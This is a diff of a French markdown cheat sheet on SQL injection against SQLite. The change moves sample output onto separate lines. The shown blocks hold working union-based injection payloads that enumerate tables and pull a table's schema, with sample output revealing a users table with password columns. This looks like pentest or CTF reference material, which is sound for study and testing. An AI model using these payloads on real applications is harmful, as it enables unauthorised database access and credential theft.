@@ -16,13 +16,15 @@
 ## Lister les tables
 
 ```sh
-' union select 1, name from sqlite_master where type='table'-- - # Output - foo, users
+' union select 1, name from sqlite_master where type='table'-- - 
+# Output : foo, users
 ```
 
 ## Retrouver le format des tables
 
 ```sh
-' union select 1, sql from sqlite_master where tbl_name = 'users' and type = 'table'-- - # Output - CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))
+' union select 1, sql from sqlite_master where tbl_name = 'users' and type = 'table'-- - 
+# Output : CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))
 ```
 
 ## Extraction
